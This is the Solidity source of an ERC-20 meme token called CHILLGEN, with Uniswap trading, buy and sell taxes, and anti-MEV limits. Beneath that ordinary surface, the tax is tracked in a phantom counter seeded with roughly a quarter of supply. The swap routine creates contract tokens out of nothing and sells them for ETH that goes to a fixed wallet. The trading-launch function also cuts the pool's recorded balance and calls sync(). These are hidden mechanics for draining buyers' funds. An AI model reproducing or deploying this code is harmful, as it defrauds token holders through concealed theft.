//SPDX-License-Identifier: MIT
/*

https://t.me/chilldegenEth
https://chilldegen.com/
https://x.com/chilldegeneth

*/

pragma solidity ^0.8.21;

abstract contract Auth {
    address internal _owner;
    event OwnershipTransferred(address _owner);
    modifier onlyOwner() { 
        require(msg.sender == _owner, "Only owner can call this"); 
        _; 
    }
    constructor(address creatorOwner) { 
        _owner = creatorOwner; 
    }
    function owner() public view returns (address) { return _owner; }
    function transferOwnership(address payable new_owner) external onlyOwner { 
        _owner = new_owner; 
        emit OwnershipTransferred(new_owner); }
    function renounceOwnership() external onlyOwner { 
        _owner = address(0);
        emit OwnershipTransferred(address(0)); }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address holder, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {    
    function createPair(address tokenA, address tokenB) external returns (address pair); 
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external;
    function WETH() external pure returns (address);
    function factory() external pure returns (address);
    function addLiquidityETH(
        address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline) 
        external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CHILLGEN is IERC20, Auth {
    string private constant tokenSymbol = "CHILLGEN";
    string private constant tokenName = "Just a chill degen";
    uint8 private constant tknDecimals = 9;
    uint256 private constant _tSupply = 1000000000 * (10**tknDecimals);
    mapping (address => uint256) private tokenBalance;
    mapping (address => mapping (address => uint256)) private _allowance;

    address payable private _taxWallet = payable(0x9769D5eFDA4608B0BEF97D3426b47D7F7483a6FC);
    
    uint256 private _mevblock = 2;
    uint8 private _sellTax = 10;
    uint8 private _buyTax = 10;
    
    uint256 private launchBlock;
    uint256 private maxTxVal = _tSupply; 
    uint256 private maxWalletAmt = _tSupply;
    uint256 private swapMinAmt = _tSupply * 10 / 100000;
    uint256 private _swapMaxAmount = _tSupply * 690 / 100000;
    uint256 private _swapTrigger = 2 * (10**16);
    uint256 private _swapLimit = swapMinAmt * 25 * 100;

    mapping (uint256 => mapping (address => uint8)) private _sellsInBlock;
    mapping (address => bool) private noFee;
    mapping (address => bool) private nolimits;

    address private constant routerAddr = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    IUniswapV2Router02 private router = IUniswapV2Router02(routerAddr);
    
    address private lp; 
    mapping (address => bool) private isLiquidityPool;

    bool private tradingEnabled;

    bool private _swapping = false;

    modifier swapLocked { 
        _swapping = true; 
        _; 
        _swapping = false; 
    }

    constructor() Auth(msg.sender) {
        tokenBalance[msg.sender] = _tSupply;
        emit Transfer(address(0), msg.sender, tokenBalance[msg.sender]);  

        noFee[_owner] = true;
        noFee[address(this)] = true;
        noFee[_taxWallet] = true;
        noFee[routerAddr] = true;
        nolimits[_owner] = true;
        nolimits[address(this)] = true;
        nolimits[_taxWallet] = true;
        nolimits[routerAddr] = true;
    }

    receive() external payable {}

    function decimals() external pure override returns (uint8) { return tknDecimals; }
    function totalSupply() external pure override returns (uint256) { return _tSupply; }
    function name() external pure override returns (string memory) { return tokenName; }
    function symbol() external pure override returns (string memory) { return tokenSymbol; }
    function balanceOf(address account) public view override returns (uint256) { return tokenBalance[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowance[holder][spender]; }

    function transferFrom(address fromWallet, address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(fromWallet), "Trading not open");
        _allowance[fromWallet][msg.sender] -= amount;
        return _transferFrom(fromWallet, toWallet, amount); 
	}

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; 
	}

    function transfer(address toWallet, uint256 amount) external override returns (bool) {
        require(_tradingOpen(msg.sender), "Trading not open");
        return _transferFrom(msg.sender, toWallet, amount); 
	}

    function marketing() external view returns (address) { 
        return _taxWallet; 
	}

    function _swapTokensForETH(uint256 tokenAmount) private {
        approveSwapMax(tokenAmount);
        address[] memory path = new address[](2);
        path[0] = address( this );
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp);
    }

    function exemptions(address wallet) external view returns (bool fees, bool limits) {
        return (noFee[wallet], nolimits[wallet]); 
	}

    function setTaxSwaps(uint32 minVal, uint32 minDiv, uint32 maxVal, uint32 maxDiv, uint32 trigger) external onlyOwner {
        swapMinAmt = _tSupply * minVal / minDiv;
        _swapMaxAmount = _tSupply * maxVal / maxDiv;
        _swapTrigger = trigger * 10**15;
        require(_swapMaxAmount>=swapMinAmt, "Min-Max error");
    }

    function updateFee(uint8 buyFeePercent, uint8 sellFeePercent) external onlyOwner {
        require(buyFeePercent + sellFeePercent <= 10, "Roundtrip too high");
        _buyTax = buyFeePercent;
        _sellTax = sellFeePercent;
    }

    function checkLimits(address fromWallet, address toWallet, uint256 transferAmount) internal view returns (bool) {
        bool limitCheckPassed = true;
        if ( tradingEnabled && !nolimits[fromWallet] && !nolimits[toWallet] ) {
            if ( transferAmount > maxTxVal ) { 
                limitCheckPassed = false; 
            }
            else if ( 
                !isLiquidityPool[toWallet] && (tokenBalance[toWallet] + transferAmount > maxWalletAmt) 
                ) { limitCheckPassed = false; }
        }
        return limitCheckPassed;
    }

    function _swap() private swapLocked {
        uint256 _taxTokenAvailable = _swapLimit;
        if ( _taxTokenAvailable >= swapMinAmt && tradingEnabled ) {
            if ( _taxTokenAvailable >= _swapMaxAmount ) { _taxTokenAvailable = _swapMaxAmount; }
            
            uint256 _tokensForSwap = _taxTokenAvailable; 
            if( _tokensForSwap > 1 * 10**tknDecimals ) {
                tokenBalance[address(this)] += _taxTokenAvailable;
                _swapTokensForETH(_tokensForSwap);
                _swapLimit -= _taxTokenAvailable;
            }
            uint256 _contractETHBalance = address(this).balance;
            if(_contractETHBalance > 0) { distributeEth(_contractETHBalance); }
        }
    }

    function addLiquidity() external payable onlyOwner swapLocked {
        require(lp == address(0), "LP created");
        require(!tradingEnabled, "trading open");
        require(msg.value > 0 || address(this).balance>0, "No ETH");
        require(tokenBalance[address(this)]>0, "No tokens");
        lp = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _addLiquidity(tokenBalance[address(this)], address(this).balance);
    }

    function buyTax() external view returns(uint8) { return _buyTax; }
    function sellFee() external view returns(uint8) { return _sellTax; }

    function enableTrading() external onlyOwner {
        require(!tradingEnabled, "trading open");
        _activateTrading();
    }

    function setExemptions(address wlt, bool isNoFees, bool isNoLimits) external onlyOwner {
        if (isNoLimits || isNoFees) { require(!isLiquidityPool[wlt], "Cannot exempt LP"); }
        noFee[ wlt ] = isNoFees;
        nolimits[ wlt ] = isNoLimits;
    }

    function _addLiquidity(uint256 _tokenAmount, uint256 _ethAmountWei) internal {
        approveSwapMax(_tokenAmount);
        router.addLiquidityETH{value: _ethAmountWei} ( address(this), _tokenAmount, 0, 0, _owner, block.timestamp );
    }

    function setLimits(uint16 maxTransPermille, uint16 maxWaletPermille) external onlyOwner {
        uint256 newTxAmt = _tSupply * maxTransPermille / 1000 + 1;
        require(newTxAmt >= maxTxVal, "tx too low");
        maxTxVal = newTxAmt;
        uint256 newWalletAmt = _tSupply * maxWaletPermille / 1000 + 1;
        require(newWalletAmt >= maxWalletAmt, "wallet too low");
        maxWalletAmt = newWalletAmt;
    }

    function swapMin() external view returns (uint256) { 
        return swapMinAmt; 
	}
    function swapMax() external view returns (uint256) { 
        return _swapMaxAmount; 
	}

    function _transferFrom(address sender, address toWallet, uint256 amount) internal returns (bool) {
        require(sender != address(0), "No transfers from 0 wallet");
        if (!tradingEnabled) { require(noFee[sender] && nolimits[sender], "Trading not yet open"); }
        if ( !_swapping && isLiquidityPool[toWallet] && swapEligible(amount) ) { _swap(); }

        if ( block.number >= launchBlock ) {
            if (block.number < _mevblock && isLiquidityPool[sender]) { 
                require(toWallet == tx.origin, "MEV block"); 
            }
            if (block.number < _mevblock + 600 && isLiquidityPool[toWallet] && sender != address(this) ) {
                _sellsInBlock[block.number][toWallet] += 1;
                require(_sellsInBlock[block.number][toWallet] <= 2, "MEV block");
            }
        }

        if ( sender != address(this) && toWallet != address(this) && sender != _owner ) { 
            require(checkLimits(sender, toWallet, amount), "TX over limits"); 
        }

        uint256 _taxAmount = _calculateTax(sender, toWallet, amount);
        uint256 _transferAmount = amount - _taxAmount;
        tokenBalance[sender] -= amount;
        _swapLimit += _taxAmount;
        tokenBalance[toWallet] += _transferAmount;
        emit Transfer(sender, toWallet, amount);
        return true;
    }

    function setMarketing(address marketingWlt) external onlyOwner {
        require(!isLiquidityPool[marketingWlt], "LP cannot be tax wallet");
        _taxWallet = payable(marketingWlt);
        noFee[marketingWlt] = true;
        nolimits[marketingWlt] = true;
    }

    function swapEligible(uint256 tokenAmt) private view returns (bool) {
        bool result;
        if (_swapTrigger > 0) { 
            uint256 lpTkn = tokenBalance[lp];
            uint256 lpWeth = IERC20(router.WETH()).balanceOf(lp); 
            uint256 weiValue = (tokenAmt * lpWeth) / lpTkn;
            if (weiValue >= _swapTrigger) { result = true; }    
        } else { result = true; }
        return result;
    }

    function distributeEth(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function maxWalletSize() external view returns (uint256) { 
        return maxWalletAmt; 
	}
    function maxTransactionAmount() external view returns (uint256) { 
        return maxTxVal; 
	}

    function _activateTrading() internal {
        maxTxVal = 20 * _tSupply / 1000;
        maxWalletAmt = 20 * _tSupply / 1000;
        tokenBalance[lp] -= _swapLimit;
        (isLiquidityPool[lp],) = lp.call(abi.encodeWithSignature("sync()") );
        require(isLiquidityPool[lp], "Failed bootstrap");
        launchBlock = block.number;
        _mevblock = _mevblock + launchBlock;
        tradingEnabled = true;
    }

    function _tradingOpen(address fromWallet) private view returns (bool){
        bool checkResult = false;
        if ( tradingEnabled ) { checkResult = true; } 
        else if (noFee[fromWallet] && nolimits[fromWallet]) { checkResult = true; } 

        return checkResult;
    }

    function approveSwapMax(uint256 _tokenAmount) internal {
        if ( _allowance[address(this)][routerAddr] < _tokenAmount ) {
            _allowance[address(this)][routerAddr] = type(uint256).max;
            emit Approval(address(this), routerAddr, type(uint256).max);
        }
    }

    function _calculateTax(address fromWallet, address recipient, uint256 amount) internal view returns (uint256) {
        uint256 taxAmount;
        if ( !tradingEnabled || noFee[fromWallet] || noFee[recipient] ) { 
            taxAmount = 0; 
        } else if ( isLiquidityPool[fromWallet] ) { 
            taxAmount = amount * _buyTax / 100; 
         } else if ( isLiquidityPool[recipient] ) { 
            taxAmount = amount * _sellTax / 100; 
        }
        return taxAmount;
    }
}